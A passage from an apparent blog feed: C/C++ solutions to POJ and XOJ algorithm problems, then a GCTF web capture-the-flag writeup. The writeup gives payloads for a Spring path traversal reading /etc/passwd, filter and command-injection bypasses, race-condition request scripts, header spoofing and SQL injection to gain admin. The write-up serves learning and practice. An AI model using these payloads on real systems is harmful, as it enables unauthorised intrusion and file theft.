提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define X 20#define Y 20using namespace std;int x,y;int nx,ny;int sx,sy;int num;char maze[X][Y];int dx[4] = &#123;-1,0,1,0&#125;;int dy[4] = &#123;0,1,0,-1&#125;;void dfs(int r, int s)&#123; num += 1; maze[r][s] = '#'; for (int i = 0; i &lt; 4; i++)&#123; int t1 = r+dx[i]; int t2 = s+dy[i]; if (0 &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; 0 &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == '.')&#123; dfs(t1,t2); &#125; &#125;&#125;int main()&#123; scanf("%d%d",&amp;y,&amp;x); while( x != 0 &amp;&amp; y != 0)&#123; num = 0; for (int i = 0; i &lt; x; i++)&#123; for (int j = 0; j &lt; y; j++)&#123; scanf("\n%c",&amp;maze[i][j]); if (maze[i][j] == '@')&#123; sx = i; sy = j; &#125; &#125; &#125; dfs(sx,sy); printf("%d\n",num); scanf("%d%d",&amp;y,&amp;x); &#125; return 0;&#125; 2236题目http://poj.org/problem?id=2236 思路并查集。用结构体数组来作为节点，repair表示是否已经修理过，par表示其父节点。其余利用并查集即可。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#define MAX_N 1002using namespace std;struct node&#123; int repair; int par;&#125;computer[MAX_N];int ran[MAX_N];struct loc&#123; int x; int y;&#125;zuobiao[MAX_N];int n,d;int p,q;char op;void init_set(int n)&#123; for(int i=1; i &lt;= n; i++)&#123; computer[i].repair = 0; computer[i].par = i; ran[i] = 0; &#125;&#125;int find_root(int q)&#123; int i = q; while(computer[i].par != i)&#123; i = computer[i].par; &#125; while(computer[q].par != i)&#123; int temp = computer[q].par; computer[q].par = i; q = temp; &#125; return i;&#125;int same_set(int p,int q)&#123; return find_root(p) == find_root(q);&#125;void union_set(int p, int q)&#123; int p_root = find_root(p); int q_root = find_root(q); if (p_root == q_root) return; if(ran[p_root] &gt; ran[q_root])&#123; computer[q_root].par = p_root; &#125;else&#123; computer[p_root].par = q_root; if (ran[p_root] == ran[q_root])&#123; ran[q_root]++; &#125; &#125;&#125;int cal_distance(int p,int q)&#123; return (zuobiao[p].x-zuobiao[q].x)*(zuobiao[p].x-zuobiao[q].x)+(zuobiao[p].y-zuobiao[q].y)*(zuobiao[p].y-zuobiao[q].y);&#125;int maxdistance;int main()&#123; scanf("%d%d",&amp;n,&amp;d); maxdistance = d * d; for (int i = 1;i &lt;= n; i++)&#123; scanf("%d%d",&amp;zuobiao[i].x,&amp;zuobiao[i].y); &#125; init_set(n); while(scanf("\n%c",&amp;op) != EOF)&#123; if (op == 'O')&#123; scanf("%d",&amp;p); computer[p].repair = 1; for (int j = 1; j &lt;= n; j++)&#123; if (computer[j].repair == 1) if (cal_distance(p,j) &lt;= maxdistance)&#123; union_set(p,j); &#125; &#125; &#125;else&#123; scanf("%d%d",&amp;p,&amp;q); if (same_set(p,q))&#123; printf("SUCCESS\n"); &#125;else&#123; printf("FAIL\n"); &#125; &#125; &#125; return 0;&#125; 2387题目http://poj.org/problem?id=2387 思路最短路径 + 队列优先 。这题竟然是先读入边数再读入顶点数，Ｏrz另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#define MAX_V 200000#define INF 0xFFFFFFusing namespace std;struct edge &#123; int to, cost, flag ;&#125;;typedef pair&lt;int, int&gt; P;int V;int E;vector&lt;edge&gt; G[MAX_V];int d[MAX_V];void dijkstra(int s);int main()&#123; scanf("%d%d", &amp;E,&amp;V); for (int i = 0; i &lt; E; i++)&#123; int s, t, cost; edge temp1,temp2; scanf("%d%d%d", &amp;s, &amp;t, &amp;cost); temp1.to = t; temp1.cost = cost; G[s].push_back(temp1); temp2.to = s; temp2.cost = cost; G[t].push_back(temp2); &#125; dijkstra(1); printf("%d",d[V]); return 0;&#125;void dijkstra(int s)&#123; priority_queue&lt;P, vector&lt;P&gt;, greater&lt;P&gt; &gt; que; fill(d+1,d + V+1, INF); d[s] = 0; que.push(P(0,s)); while ( !que.empty())&#123; P p = que.top(); que.pop(); int v = p.second; if ( d[v] &lt; p.first) continue; for (int i = 0; i &lt; G[v].size(); i++)&#123; edge e = G[v][i]; if ( d[e.to] &gt; d[v] + e.cost) &#123; d[e.to] = d[v] + e.cost; que.push(P(d[e.to], e.to)); &#125; &#125; &#125;&#125; 2388题目http://poj.org/problem?id=2388 思路先排序，之后打印出中间值。水题。 提交stl1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; sort(arr,arr+n); printf("%d",arr[n/2]); return 0;&#125; 快排12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];void quick_sort(int l,int h)&#123; if(h&lt;l+2)return ; int e=h,p=l; while(l&lt;h) &#123; while(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]); while(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]); if(l&lt;h) swap(arr[l],arr[h]); &#125; swap(arr[h],arr[p]); quick_sort(p,h); quick_sort(l,e);&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; quick_sort(0,n); printf("%d",arr[n/2]); return 0;&#125; 3069题目http://poj.org/problem?id=3069 思路贪心算法。在 while( i &lt; n ) 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。 提交123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define N 1005using namespace std;int n;int r;int loc[N];int marknum;int main()&#123; scanf("%d%d",&amp;r,&amp;n); while ( n != -1 &amp;&amp; r != -1)&#123; for (int i = 0; i &lt; n; i++) scanf("%d",&amp;loc[i]); sort(loc,loc+n); marknum = 0; int i = 0; int j = 0; while ( i &lt; n )&#123; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] ) i++; i--; marknum++; j = i; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i]) i++; j = i; &#125; printf("%d\n",marknum); scanf("%d%d",&amp;r,&amp;n); &#125; return 0;&#125; 3176题目http://poj.org/problem?id=3176 思路二维数组triangle用于保存三角形，二维数组way用于保存路径。以题目数据为例：1234573 88 1 02 7 4 44 5 2 6 5 分为三种情况： 最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j] 最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j]; 中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; 填表完成后，对最后一行way[n-1][]找出最大值即为答案。 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 3253题目http://poj.org/problem?id=3253 思路霍夫曼树的变形。重点在于对两个最小值相加后对数组的处理。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;using namespace std;int n;int k;int len[20005];int total;void solve()&#123; long long ans = 0; while ( n &gt; 1 )&#123; int mii1 = 0; int mii2 = 1; if (len[mii1] &gt; len[mii2]) swap(mii1,mii2); for (int i = 2; i &lt; n; i++)&#123; if (len[i] &lt; len[mii1])&#123; mii2 = mii1; mii1 = i; &#125; else if (len[i] &lt; len[mii2])&#123; mii2 = i; &#125; &#125; int t = len[mii1] + len[mii2]; ans += t; if (mii1 == n-1) swap(mii1,mii2); len[mii1] = t; len[mii2] = len[n-1]; n--; &#125; printf("%lld\n",ans);&#125;int main()&#123; total = 0; k = 0; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;len[i]); &#125; solve(); return 0;&#125; 3617题目http://poj.org/problem?id=3617 思路贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;using namespace std;int n;char s[2005];char t[2005];int sp,ep;int compare(int i,int j)&#123; if (s[i] &gt; s[j])&#123; return 1; &#125; else if (s[i] &lt; s[j])&#123; return 0; &#125; else if (s[i] == s[j])&#123; i++; j--; return compare(i,j); &#125;&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf(" %c",&amp;s[i]); &#125; sp = 0; ep = n-1; int lenoft = 0; while (lenoft != n)&#123; int p = compare(sp,ep); if (p == 0)&#123; t[lenoft] = s[sp]; sp++; lenoft++; &#125; else if (p == 1)&#123; t[lenoft] = s[ep]; ep--; lenoft++; &#125; &#125; for (int i = 1; i &lt;= n; i++)&#123; printf("%c",t[i-1]); if (i % 80 == 0) printf("\n"); &#125; printf("\n"); return 0;&#125; XOJ1004想法冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：） 提交12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[1000004];int main()&#123; int n; scanf("%d",&amp;n); int i,j; for(i = 0;i &lt; n;i++) scanf("%d",&amp;arrays[i]); sort(arrays,arrays+n); for(j = 0;j &lt; n - 1;j++) printf("%d ",arrays[j]); printf("%d",arrays[n - 1]); return 0;&#125; oj对格式要求好严格… 1005此题另写一篇文章了。 1022想法直接用普通的矩阵乘法就过了，时间复杂度 O(n^3) 提交123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;stdio.h&gt;int main()&#123; int n1,m1; int n2,m2; int matrix1[100][100]; int matrix2[100][100]; scanf("%d%d",&amp;n1,&amp;m1); int i,j; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m1;j++) scanf("%d",&amp;matrix1[i][j]); scanf("%d%d",&amp;n2,&amp;m2); for(i = 0;i &lt; n2;i++) for(j = 0;j &lt; m2;j++) scanf("%d",&amp;matrix2[i][j]); int matrix3[100][100]; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m2;j++) matrix3[i][j]=0; int i1,j2; for(i1 = 0;i1 &lt; n1;i1++) for(j2 = 0;j2 &lt; m2;j2++) for(j = 0;j &lt; n2;j++) matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2]; for(i = 0;i &lt; n1;i++) &#123; for(j = 0;j &lt; m2 - 1;j++) printf("%d ",matrix3[i][j]); printf("%d\n",matrix3[i][m2-1]); &#125; return 0;&#125; 1061想法贪心算法。其实就是任务选择问题。 按照约会完成时间从早到晚排序 选择具有最早完成时间的girl 将此girl加入到约会列表中 对子问题重复上述问题 强烈谴责Ckp 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;typedef struct info&#123; char name[16]; char starttime[6]; char endtime[6];&#125;info;void quick_sort(info * s, int l, int r,int n);int main()&#123; int n; static info mm[1005] ; static info mmcopy[1005]; scanf("%d",&amp;n); int i,j; for (i = 1; i &lt;= n; i++)&#123; scanf("%s%s%s",mm[i].name,mm[i].starttime,mm[i].endtime); &#125; quick_sort(mm,1,n,n); strcpy(mmcopy[1].endtime,mm[1].endtime); strcpy(mmcopy[1].name,mm[1].name); strcpy(mmcopy[1].starttime,mm[1].starttime); int cal = 1; for (i = 2; i &lt;= n; i++)&#123; if (strcmp(mmcopy[cal].endtime,mm[i].starttime) &lt;= 0)&#123; cal++; strcpy(mmcopy[cal].endtime,mm[i].endtime); strcpy(mmcopy[cal].name,mm[i].name); strcpy(mmcopy[cal].starttime,mm[i].starttime); &#125; &#125; printf("%d\n",cal); for ( i = 1; i &lt; cal; i++)&#123; printf("%s ",mmcopy[i].name); &#125; printf("%s",mmcopy[i].name); return 0;&#125;void quick_sort(info* s, int l, int r,int n)&#123; if (l &lt; r)&#123; int i = l, j = r; int temp; info x; strcpy(x.endtime,s[l].endtime); strcpy(x.name,s[l].name); strcpy(x.starttime,s[l].starttime); while (i &lt; j) &#123; while(i &lt; j &amp;&amp; strcmp(s[j].endtime,x.endtime) &gt;= 0) j--; if(i &lt; j)&#123; strcpy(s[i].endtime,s[j].endtime); strcpy(s[i].starttime,s[j].starttime); strcpy(s[i].name , s[j].name); i++; &#125; while(i &lt; j &amp;&amp; strcmp(s[i].endtime,x.endtime) &lt; 0) i++; if(i &lt; j)&#123; strcpy(s[j].endtime,s[i].endtime); strcpy(s[j].starttime,s[i].starttime); strcpy(s[j].name,s[i].name); j--; &#125; &#125; strcpy(s[i].endtime,x.endtime); strcpy(s[i].starttime,x.starttime); strcpy(s[i].name,x.name); quick_sort(s, l, i - 1,n); quick_sort(s, i + 1, r,n); &#125;&#125; 1062想法贪心算法。背包问题。尽量选择面值大的。将元转换为角，这样都是整数，进行处理更方便。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;using namespace std;typedef struct zhibi&#123; int number; int value;&#125;zhibi;int main()&#123; int stat = 0; int n; scanf("%d",&amp;n); zhibi arr[7]; int i; for (i = 1; i &lt; 7; i++)&#123; scanf("%d",&amp;arr[i].number); &#125; arr[1].value = 500; arr[2].value = 100; arr[3].value = 50; arr[4].value = 10; arr[5].value = 5; arr[6].value = 1; int remainMoney; remainMoney = 1000 - n * 25; for (i = 1; i &lt; 7; i++)&#123; if (remainMoney == 0)&#123; break; &#125; else &#123; int j = remainMoney / arr[i].value; int number = j&gt;arr[i].number?arr[i].number:j; remainMoney = remainMoney - number*arr[i].value; stat = stat + number; &#125; &#125; if (remainMoney == 0)&#123; printf("%d",stat); &#125; else &#123; printf("-1\n"); &#125; return 0;&#125; 1075思路直接dijkstra。 采用邻接矩阵存储。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // 保存 图 （各权值）int n; // 顶点数int d[MAXN]; // 从初始点出发 的最短距离bool used[MAXN]; // 已经使用过的图void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; 1078思路任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。 提交dijkstra算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // 保存 图 （各权值）int n; // 顶点数int d[MAXN]; // 从初始点出发 的最短距离bool used[MAXN]; // 已经使用过的图void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; Floyd-Warshall 算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX 102#define INF 0xfffffint G[MAX][MAX];int n;void warshall_floyd();int min(int a, int b);int max(int a, int b);int main()&#123; int i, j; int M = 0; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++)&#123; scanf("%d", &amp;G[i][j]); if ( G[i][j] == 0) G[i][j] = INF; if ( i == j ) G[i][j] = 0; &#125; warshall_floyd(); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) M = max(M, G[i][j]); if ( M == INF) printf("%d",-1); else printf("%d\n", M-1); return 0;&#125;void warshall_floyd()&#123; int k, i, j; for (k = 1; k &lt;= n; k++) for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) G[i][j] = min(G[i][j], G[i][k] + G[k][j]);&#125;int min(int a, int b)&#123; return a &gt; b ? b : a;&#125;int max(int a, int b)&#123; return a &gt; b ? a : b;&#125; 1316想法贪心算法。背包问题。有别于0/1背包问题。每次选取尽量多的单位价值高的物体。 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;using namespace std;typedef struct unit&#123; double unitValue; int id; double weight; double value;&#125;unit;void quick_sort(unit s[], int l, int r);int main()&#123; double m,n; static unit valuesor[100010]; scanf("%lf%lf",&amp;m,&amp;n); int i; for (i = 1; i &lt;= n; i++)&#123; scanf("%lf%lf",&amp;valuesor[i].weight,&amp;valuesor[i].value); valuesor[i].unitValue = (double)valuesor[i].value / (double)valuesor[i].weight; valuesor[i].id = i; &#125; quick_sort(valuesor,1,n); double remainSpace = m; double allValue = 0; i = 1; for (i = 1; i &lt;= n ; i++)&#123; if (remainSpace &lt;= 0) break; if (valuesor[i].weight &lt;= remainSpace)&#123; remainSpace = remainSpace - valuesor[i].weight; allValue += valuesor[i].value; &#125;else&#123; allValue += remainSpace *valuesor[i].unitValue; remainSpace = 0; &#125; &#125; printf("%lf\n",allValue); return 0;&#125;void quick_sort(unit s[], int l, int r)&#123; if (l &lt; r) &#123; int i = l, j = r; unit x = s[l]; while (i &lt; j) &#123; while(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue) j--; if(i &lt; j)&#123; s[i].unitValue = s[j].unitValue; s[i].id = s[j].id; s[i].value = s[j].value; s[i].weight = s[j].weight; i++; &#125; while(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue) i++; if(i &lt; j)&#123; s[j].unitValue = s[i].unitValue; s[j].id = s[i].id; s[j].value = s[i].value; s[j].weight = s[i].weight; j--; &#125; &#125; s[i].id = x.id; s[i].unitValue = x.unitValue; s[i].value = x.value; s[i].weight = x.weight; quick_sort(s, l, i - 1); quick_sort(s, i + 1, r); &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GCTF-web-writeup]]></title>
      <url>%2F2017%2F06%2F19%2FGCTF-web-writeup%2F</url>
      <content type="text"><![CDATA[GCTF-web-writeup 热身题题目地址：http://218.2.197.232:18001/访问robots.txt。1http://218.2.197.232:18001/robots.txt 一个个访问过去：1http://218.2.197.232:18001/rob0t.php 得到flag：1GCTF&#123;ae609880185f1d75&#125; springcssspringcss-cve-2014-3625漏洞。github上有利用脚本:https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh 。这里的payload1：1http://218.2.197.232:18015/spring-css/resources/file:/etc/passwd payload2：1http://218.2.197.232:18015/spring-css/resources/file:/etc/flag 最后flag：1GCTF&#123;db839442402f5874&#125; PHP序列化题目地址：http://218.2.197.232:18017/ 题目给了源码：1234567891011&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set('session.serialize_handler', 'php_serialize');header("content-type;text/html;charset=utf-8");session_start();if(isset($_GET['src']))&#123; $_SESSION['src'] = $_GET['src']; highlight_file(__FILE__); print_r($_SESSION['src']);&#125;?&gt; 里面提到了session.serialize_handler，想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》 条件竞争题目地址：http://218.2.197.242:18009/ 查看源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpheader("Content-type: text/html; charset=utf-8");session_start();$mysqli = new mysqli("localhost", "root", "", "gctf09");if ($mysqli-&gt;connect_errno) &#123; die("数据库连接错误，多次出现请联系管理员。");&#125;//打印源码if(isset($_REQUEST['showcode']))&#123; highlight_file(___FILE___); exit();&#125;$user="";// 初次访问生成用户if(!isset($_SESSION["name"]))&#123; $user=substr(md5(uniqid().uniqid()),8,16); $_SESSION["name"]=$user; $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($user)); $stmt-&gt;execute(); $stmt-&gt;close(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close();&#125;else&#123; $user=$_SESSION["name"];&#125;//重置时清理用户信息if($_SERVER["REQUEST_METHOD"] === "POST" &amp;&amp; $_GET['method']==="reset" &amp;&amp; isset($_POST['password']) )&#123; $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`user` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`priv` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($_POST['password'])); $stmt-&gt;execute(); $stmt-&gt;close(); //判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限 $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close(); $mysqli-&gt;close(); die("修改成功");&#125;$mysqli-&gt;close();?&gt; 初次访问生成用户时，会往user表和priv表写入数据。 而在重置用户时，进行了三个大的操作： 删除user表中对应数据，删除priv表中对应的值。 向user表中插入name和新的pass，达到更新密码的目的。 向priv表中对应的name下notadmin的值更改（即插入）为”TRUE”。 给出的源码中有一段注释：1//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限 所以在执行操作3之前，在这一个空隙里登陆的话，此时会是管理员权限。可以自己写多线程脚本，也可以用burp跑。 reset.py1234567import requestswhile True : parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/index.php?method=reset',cookies=cookies,data=parm) print r.text login.py1234567891011import requestsflag = Falsewhile not flag: parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/login.php?method=login',cookies=cookies,data=parm) print r.text if '&#123;' in r.text: flag = True break 两者分别运行。 最后flag：1GCTF&#123;KBnLGG6qR2ZdYe4HbUL8XpAP&#125; 读文件题目地址：http://218.2.197.232:18008/访问后查看源代码，如下： 若访问：1http://218.2.197.232:18008/a/down.php?p=1.txt 同样可以正常读取，可以猜测过滤了关键字：./ 若将1.txt改为flag.php，访问：12http://218.2.197.232:18008/a/down.php?p=./flag.php 则返回页面提示 waf，所以flag被waf了。 结合flag和./，同时我们知道flag在根目录下，而down在文件夹a下，应该要往回访问。构造下述链接：1http://218.2.197.232:18008/a/down.php?p=...//fl./ag.php ...//fl./ag.php中，./被过滤后会变成../flag.php，这样就能成功读取了。 最后flag：1GCTF&#123;drthSDFSDGFSdsfhfg&#125; RCE绕过题目地址：http://218.2.197.232:18006/有点类似“春秋杯”的web。构造如下payload：12http://218.2.197.232:18006/?cmd=%0acat%09 Forbidden题目地址：http://218.2.197.232:18002/ 访问得到forbidden，但返回头为200，所以是个人为写的页面。查看源代码下拉得到提示：1&lt;!--只允许本机访问。 --&gt; 在请求包中添加：1X-Forwarded-For:localhost 得到下一个提示：1&lt;!--只能通过域名访问 --&gt; 在请求包中继续添加：1Host:www.topsec.com 得到下一个提示：1&lt;!--只允许从百度跳转到本页面访问。 --&gt; 在请求包中继续添加：1Referer:www.baidu.com 得到下一个提示：1&lt;!--只允许使用ajax访问本页面 --&gt; 在请求包中继续添加：1X-Requested-With:XMLHttpRequest 得到下一个提示：1&lt;!--本站只允许使用IE4访问 --&gt; 在网上查一查，将userAgent修改如下：1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98) 得到下一个提示：1&lt;!--电脑上必须安装有.NET8 --&gt; 修改userAgent如下1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98;.NET CLR 8.0.50727) 得到下一个提示：1&lt;!--本站只允许德国用户访问。 --&gt; 修改userAgent如下：1Accept-Language: de-DE 得到下一个提示；1&lt;!--没有登录！ --&gt; 同时返回头中出现了：1Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d 探索如下：12344e6a59324d545a6a4e7a4d324e513d3d是十六进制编码，解码得到： NjY2MTZjNzM2NQ== 猜测是base64加密，解码得到： 66616c7365 猜测是十六进制编码，解码得到： false 要成功登陆，则login=true123true 进行十六进制编码，得到：74727565再base64编码，得到：NzQ3Mjc1NjU=再十六进制编码，得到：4e7a51334d6a63314e6a553d 在请求包中增加Cookie：1Cookie:login=4e7a51334d6a63314e6a553d 得到flag：1GCTF&#123;Dt24FbREwYJu7P8ekQHEFknK&#125; 越权注入题目地址：http://218.2.197.232:18014/ 查看源代码，得到提示，同时可以知道uid默认为500 ： 抓包改包，试着添加uid参数。 发现可以成功直接修改uid参数： 接下来考虑role参数，如果直接添加role参数： 会被拦截： 考虑进行注入。经过一番测试，可以知道，如果参数中带有引号，会被拦截，被提示说“未通过mysql_escape_string检查。” 若在uid后面加上一个括号，会出现sql报错： 猜测为update型注入，因为引号被过滤了，所以对admin进行一次hex编码，payload如下：1.....birth=11111111&amp;gender=&amp;uid=0,role=0x61646d696e 得到flag：1GCTF&#123;9CtyJLHMxkjLUs6qfUM5Cmrb&#125; web综合题目地址：http://218.2.197.232:18007/ 变态验证码题目地址： http://218.2.197.232:18003/ Java序列化题目地址： http://218.2.197.232:18005/ctfobj/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[“春秋杯”web-writeup]]></title>
      <url>%2F2017%2F06%2F18%2F%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup%2F</url>
